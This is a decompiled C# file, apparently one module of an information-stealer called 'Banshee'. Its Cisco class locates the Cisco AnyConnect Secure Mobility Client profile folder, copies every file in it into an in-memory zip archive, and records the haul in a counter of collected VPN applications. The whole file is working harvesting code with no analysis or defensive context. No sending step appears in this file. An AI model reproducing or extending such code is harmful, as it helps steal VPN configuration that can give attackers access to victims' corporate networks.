﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000028 RID: 40
	public class Cisco : ITarget
	{
		// Token: 0x06000053 RID: 83 RVA: 0x00003B3C File Offset: 0x00003B3C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Cisco", "Cisco AnyConnect Secure Mobility Client", "Profile");
			if (Directory.Exists(text))
			{
				string text2 = ZipPath.Vpn("Cisco");
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Cisco AnyConnect";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
